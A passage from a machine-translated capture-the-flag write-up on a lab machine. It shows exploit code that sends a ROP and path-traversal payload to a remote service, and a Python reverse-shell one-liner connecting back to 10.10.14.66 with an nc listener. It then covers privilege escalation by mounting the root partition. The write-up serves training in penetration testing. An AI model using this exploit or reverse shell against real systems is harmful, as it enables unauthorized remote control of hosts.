<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)<font></font>
send_ = INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.recv()<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/4a/fy/cq/4afycq7-ht7dkktpmeddwci4tqa.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Fine! </font><font style="vertical-align: inherit;">We get the shell from the root. </font><font style="vertical-align: inherit;">But he is quickly dying. </font><font style="vertical-align: inherit;">Run the listener (nc -lvp 8765) and throw the back connect shell.</font></font><br>
<br>
<pre><code class="python hljs">r.sendline(<span class="hljs-string">b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",8765));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/vj/nh/ci/vjnhcisc1ra9vng8htw8n_2phwi.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/tj/ff/ll/tjfflloqumm5mggkbrwlx2ofc6w.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And we have a stable shell. </font><font style="vertical-align: inherit;">I give the full code in the picture below. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ow/ek/pi/owekpiviv3pqxnxr-rpeqgzv6-a.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But we can‚Äôt read the root flag ...</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 3</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
By running linpeas and looking at the output, we find interesting sections, especially / dev / sda2. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's get information about all the block devices. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ld/ox/-v/ldox-vzassozbyooscg-issuoow.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Thus we have the root partition / dev / sda2. </font><font style="vertical-align: inherit;">Create a directory and mount the partition. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/ez/c5/u4ezc5zbakdqx11phjzr1cqp-yi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
So we find the root flag. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
You can join us on </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">There you can find interesting materials, merged courses, as well as software. </font><font style="vertical-align: inherit;">Let's put together a community in which there will be people who are versed in many areas of IT, then we can always help each other on any IT and information security issues.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en502256/index.html">How to visualize a Spring Integration graph using Neo4j?</a></li>
<li><a href="../en502260/index.html">ESP-NOW is an alternative communication protocol for ESP8266 and ESP32. Basic concepts</a></li>
<li><a href="../en502262/index.html">Why AIOps and umbrella monitoring for the bank, or on what are customer relations built</a></li>
<li><a href="../en502264/index.html">Public Key Infrastructure. Issue of certificates in conditions of self-isolation</a></li>
<li><a href="../en502266/index.html">Aurora on Intel platform. Dawn of the Exaflops Era</a></li>
<li><a href="../en502272/index.html">Do not say ‚ÄúI feel myself,‚Äù and other English rules that drive into a stupor</a></li>
<li><a href="../en502274/index.html">Customize the layout of the external keyboard on Android without root</a></li>
<li><a href="../en502276/index.html">Kanban method: Example PNZ No. 2: Training and Courses</a></li>
<li><a href="../en502278/index.html">How to not edit Python tests</a></li>
<li><a href="../en502286/index.html">Fire robots</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>